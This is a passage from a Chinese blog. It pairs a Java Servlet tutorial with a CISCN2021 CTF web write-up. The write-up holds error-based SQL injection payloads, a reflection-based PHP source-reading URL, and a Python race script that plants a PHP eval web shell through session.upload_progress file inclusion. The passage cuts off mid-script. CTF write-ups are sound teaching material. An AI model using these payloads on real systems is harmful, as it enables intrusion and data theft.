class="string">&quot;值:&quot;</span>+value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>成功获取到了配置的信息</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e50c871.jpg"></p>
<h1 id="HttpServletRequest-对象"><a href="#HttpServletRequest-对象" class="headerlink" title="HttpServletRequest 对象"></a>HttpServletRequest 对象</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        PrintWriter writer=response.getWriter();</span><br><span class="line"></span><br><span class="line">        writer.println(request.getMethod());  <span class="comment">//请求方式</span></span><br><span class="line">        writer.println(request.getRequestURI()); <span class="comment">//请求URL</span></span><br><span class="line">        writer.println(request.getProtocol()); <span class="comment">//请求协议</span></span><br><span class="line">        writer.println(request.getQueryString()); <span class="comment">//查询字符</span></span><br><span class="line">        writer.println(request.getHeader(<span class="string">&quot;user-agent&quot;</span>)); <span class="comment">//获取UA</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>效果</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e577f11.jpg"></p>
<h2 id="BeanUtils"><a href="#BeanUtils" class="headerlink" title="BeanUtils"></a>BeanUtils</h2><p>BeanUtils是apache commons 组件的成员之一，用于简化javaBean封装数据的操作。也就是说可以简化获取参数的方式</p>
<p>先导入包</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e5ce90c.jpg"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        PrintWriter writer = response.getWriter();</span><br><span class="line"></span><br><span class="line">        Map parameterMap = request.getParameterMap();</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            BeanUtils.populate(user,parameterMap);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IllegalAccessException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InvocationTargetException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        writer.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p>sevlet中的请求会根据作用域的范围分为请求域、会话域、上下文域</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请求域：一个用户的一次请求</span><br><span class="line">会话域：一个用户的所有请求</span><br><span class="line">上下文域：所有用户的所有请求</span><br></pre></td></tr></table></figure>

<p>范围大小</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求域 &lt; 会话域 &lt; 上下文域</span><br></pre></td></tr></table></figure>



<p>作用域存值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setAttritube(&quot;键&quot;，“值”) </span><br></pre></td></tr></table></figure>

<p>取值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getAttritube(&quot;键&quot;) </span><br></pre></td></tr></table></figure>

<p>删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">removeAttritube(&quot;键&quot;)</span><br></pre></td></tr></table></figure>



<h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p>实现页面跳转，从一个servlet跳转到另一个servlet</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setContentType((<span class="string">&quot;text/html;charset=utf-8&quot;</span>));</span><br><span class="line">        RequestDispatcher requestDispatcher=request.getRequestDispatcher(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">        requestDispatcher.forward(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>跳转到demo</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e5d85a0.jpg"></p>
<p>转发的特点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.地址栏不会发生变化，显示的还是上一个servlet的地址</span><br><span class="line">2.一共只有一次请求：请求不断链</span><br><span class="line">3.请求域中数据不会丢失：还是要满足请求不断链。</span><br><span class="line">4.转发中，是一次请求的</span><br></pre></td></tr></table></figure>



<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpServletRequestDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.sendRedirect(<span class="string">&quot;demo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>效果</p>
<p><img src="https://www.hualigs.cn/image/60a9f8e639c19.jpg"></p>
<p>重定向的特点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.地址栏：有变化，显示新的地址</span><br><span class="line">2.2次请求</span><br><span class="line">3.请求域中的数据：断链就数据丢失了</span><br><span class="line">4.重定向的根目录是：http:&#x2F;&#x2F;localhost:8080&#x2F;不包含项目的访问地址</span><br></pre></td></tr></table></figure>



<h1 id="HttpServletResponse"><a href="#HttpServletResponse" class="headerlink" title="HttpServletResponse"></a>HttpServletResponse</h1><p>设置响应的状态码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myServlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResponseDemo</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        response.setStatus(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-05-18T06:04:20.000Z" title="2021-05-18T06:04:20.000Z">2021-05-18</time>发表</span><span class="level-item"><time dateTime="2021-05-18T06:19:42.672Z" title="2021-05-18T06:19:42.672Z">2021-05-18</time>更新</span><span class="level-item">11 分钟读完 (大约1685个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></h1><div class="content"><h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h1><p>利用join进行无列名注入，先得到第一个列名为id</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a85bbd40.jpg"></p>
<p>继续读取第三个列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a859b3ba.jpg"></p>
<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;1mm1&#39;) and updatexml(1,concat(0x7e,(select group_concat(&#96;bac9c1a9-327a-4da1-9d66-cbc840b139a4&#96;) from flag)),0)%23&amp;passwd&#x3D;11&amp;Submit&#x3D;%E7%99%BB%E5%BD%95</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a8543c34.jpg"></p>
<h1 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h1><p>访问.index.php.swo得到部分源码，php内置类反序列化，根据提示猜到flag可能在注释里</p>
<p><img src="https://www.hualigs.cn/image/60a35a84bb4dd.jpg"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rc&quot;</span>];  <span class="comment">//类名</span></span><br><span class="line"><span class="variable">$rb</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rb&quot;</span>];  <span class="comment">//第二个参数</span></span><br><span class="line"><span class="variable">$ra</span>=<span class="variable">$_GET</span>[<span class="string">&quot;ra&quot;</span>];  <span class="comment">//第一个参数</span></span><br><span class="line"><span class="variable">$rd</span>=<span class="variable">$_GET</span>[<span class="string">&quot;rd&quot;</span>];  <span class="comment">//调用类的方法</span></span><br><span class="line"><span class="variable">$method</span>= <span class="keyword">new</span> <span class="variable">$rc</span>(<span class="variable">$ra</span>, <span class="variable">$rb</span>);</span><br><span class="line">var_dump(<span class="variable">$method</span>-&gt;<span class="variable">$rd</span>());</span><br></pre></td></tr></table></figure>



<p>利用getDocComment读取注释</p>
<p><img src="https://www.hualigs.cn/image/60a35a85152ab.jpg"></p>
<p>在ReflectionMethod类构造方法传入类名和方法名</p>
<p><img src="https://www.hualigs.cn/image/60a35a852cac1.jpg"></p>
<p>读取flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.70.0.162:24336&#x2F;index.php?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60a35a843591b.jpg"></p>
<h1 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h1><p>扫描目录得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;124.70.0.162:24363&#x2F;you_can_seeeeeeee_me.php</span><br></pre></td></tr></table></figure>



<p>利用session.upload_progress进行文件包含</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><img src="https://www.hualigs.cn/image/60a35a859e0ae.jpg"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;var_dump(scandir(&#x27;/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g&#x27;));&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../var/lib/php/sessions/cccdbabbhf/sess_&quot;</span>+sessid&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://124.70.0.162:24363&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://124.70.0.162:24363&#x27;</span>,data=data)</span><br><span class="line">        print(resp.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># if &#x27;passwd&#x27; in resp.text:</span></span><br><span class="line">        <span class="comment">#     print(resp.text)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment">#     event.clear()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            